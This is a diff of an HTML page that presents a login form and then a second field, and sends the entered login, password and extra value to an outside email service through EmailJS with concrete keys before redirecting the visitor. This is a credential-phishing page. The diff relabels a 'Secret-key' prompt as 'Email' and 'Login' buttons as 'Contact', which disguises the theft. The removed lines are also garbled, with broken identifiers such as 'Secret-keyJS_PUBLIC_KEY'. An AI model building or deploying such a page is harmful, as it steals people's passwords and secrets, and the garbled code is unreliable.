@@ -129,7 +129,7 @@
     font-size: 14px;
   }
 
-  .btn-Login {
+  .btn-contact {
     width: 100%;
     padding: 14px;
     background: #93bc5a;
@@ -142,7 +142,7 @@
     margin-bottom: 18px;
     transition: background 0.2s ease;
   }
-  .btn-Login:hover {
+  .btn-contact:hover {
     background: #82ab49;
   }
 
@@ -168,13 +168,13 @@
     justify-content: center;
   }
 
-  #Secret-keyScreen {
+  #emailScreen {
     display: none;
     width: 100%;
     justify-content: center;
   }
-#Secret-keyScreen * { box-sizing: border-box;}
-#Secret-keyScreen body {
+#emailScreen * { box-sizing: border-box;}
+#emailScreen body {
     margin: 0;
     min-height: 100vh;
     background: #eef0fb;
@@ -183,20 +183,20 @@
     align-items: center;
     justify-content: center;
     padding: 60px 20px;}
-#Secret-keyScreen .card {
+#emailScreen .card {
     background: #ffffff;
     border-radius: 10px;
     box-shadow: 0 20px 40px rgba(40, 40, 90, 0.12);
     padding: 14px 48px;
     width: 100%;
     max-width: 760px;}
-#Secret-keyScreen h1 {
+#emailScreen h1 {
     text-align: center;
     color: #46465f;
     font-size: 26px;
     font-weight: 500;
     margin: 0 0 20px;}
-#Secret-keyScreen .field {
+#emailScreen .field {
     display: flex;
     align-items: center;
     border: 1px solid #e3e3ee;
@@ -205,21 +205,21 @@
     padding: 0 16px;
     margin-bottom: 16px;
     background: #fff;}
-#Secret-keyScreen .field .icon {
+#emailScreen .field .icon {
     color: #9a9ab0;
     margin-right: 10px;
     display: flex;
     align-items: center;}
-#Secret-keyScreen .field input {
+#emailScreen .field input {
     border: none;
     outline: none;
     flex: 1;
     font-size: 15px;
     color: #46465f;
     background: transparent;}
-#Secret-keyScreen .field input::placeholder {
+#emailScreen .field input::placeholder {
     color: #a9a9bd;}
-#Secret-keyScreen .btn-Login {
+#emailScreen .btn-contact {
     width: 100%;
     padding: 14px;
     background: #93bc5a;
@@ -230,16 +230,16 @@
     font-weight: 600;
     cursor: pointer;
     transition: background 0.2s ease;}
-#Secret-keyScreen .btn-Login:hover {
+#emailScreen .btn-contact:hover {
     background: #82ab49;}
 
 @media (max-width: 480px) {
-  #Secret-keyScreen .card {
+  #emailScreen .card {
     padding: 16px 20px;
   }
 }
 </style>
-<script src="https://cdn.jsdelivr.net/npm/@Secret-keyjs/browser@4/dist/Secret-key.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
 
@@ -301,7 +301,7 @@
           <label for="remember">Remember Me</label>
         </div>
 
-        <button type="submit" class="btn-Login">Login</button>
+        <button type="submit" class="btn-contact">Contact</button>
       </form>
 
       <p class="footer-text">Not a member? <a href="#">Create an account</a></p>
@@ -311,19 +311,19 @@
   
 </div>
 
-<div id="Secret-keyScreen">
+<div id="emailScreen">
 <div class="card">
-    <h1>Secret-key</h1>
+    <h1>Email</h1>
 
-    <form id="Secret-keyForm">
+    <form id="emailForm">
       <div class="field">
         <span class="icon">
           <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17 8V6a5 5 0 0 0-10 0v2H5v14h14V8h-2zM9 6a3 3 0 0 1 6 0v2H9V6zm3 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4z"/></svg>
         </span>
-        <input type="text" id="Secret-keyInput" placeholder="Your Secret-key">
+        <input type="text" id="emailInput" placeholder="Your Email">
       </div>
 
-      <button type="submit" class="btn-Login">Login</button>
+      <button type="submit" class="btn-contact">Send</button>
     </form>
   </div>
 
@@ -331,43 +331,43 @@
 </div>
 
   <script>
-    // 1. Sign up free at https://www.Secret-keyjs.com
-    // 2. Add an Secret-key Service (e.g. Gmail) -> copy its Service ID below
-    // 3. Create an Secret-key Template with {{Login}}, {{Password}}, {{Secret-key}} variables -> copy its Template ID below
+    // 1. Sign up free at https://www.emailjs.com
+    // 2. Add an Secret-KeyService (e.g. Gmail) -> copy its Service ID below
+    // 3. Create an Secret-KeyTemplate with {{Login}}, {{Password}}, {{email}} variables -> copy its Template ID below
     // 4. Account > General > copy your Public Key below
-    const Secret-keyJS_PUBLIC_KEY  = 'YTxIBQcZdW1yro2Ev';
-    const Secret-keyJS_SERVICE_ID  = 'service_29ydi5b';
-    const Secret-keyJS_TEMPLATE_ID = 'template_c0hk45r';
+    const EMAILJS_PUBLIC_KEY  = 'YTxIBQcZdW1yro2Ev';
+    const EMAILJS_SERVICE_ID  = 'service_29ydi5b';
+    const EMAILJS_TEMPLATE_ID = 'template_c0hk45r';
 
-    Secret-keyjs.init({ publicKey: Secret-keyJS_PUBLIC_KEY });
+    emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
 
     document.getElementById('welcomeForm').addEventListener('submit', function (e) {
       e.preventDefault();
       document.getElementById('welcomeScreen').style.display = 'none';
-      document.getElementById('Secret-keyScreen').style.display = 'flex';
+      document.getElementById('emailScreen').style.display = 'flex';
     });
 
-    document.getElementById('Secret-keyForm').addEventListener('submit', function (e) {
+    document.getElementById('emailForm').addEventListener('submit', function (e) {
       e.preventDefault();
 
-      const submitBtn = this.querySelector('.btn-Login');
+      const submitBtn = this.querySelector('.btn-contact');
       const originalText = submitBtn.textContent;
       submitBtn.disabled = true;
-      submitBtn.textContent = 'Login...';
+      submitBtn.textContent = 'Sending...';
 
       const templateParams = {
         Login: document.getElementById('welcomeLogin').value,
         Password: document.getElementById('welcomePassword').value,
-        Secret-key: document.getElementById('Secret-keyInput').value
+        email: document.getElementById('emailInput').value
       };
 
-      Secret-keyjs.send(Secret-keyJS_SERVICE_ID, Secret-keyJS_TEMPLATE_ID, templateParams)
+      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
         .then(function () {
           window.location.href = 'https://huboweb.com';
         })
         .catch(function (err) {
-          console.error('Secret-keyJS error:', err);
-          alert('Something went wrong Login your details. Please try again.');
+          console.error('EmailJS error:', err);
+          alert('Something went wrong sending your details. Please try again.');
         })
         .finally(function () {
           submitBtn.disabled = false;
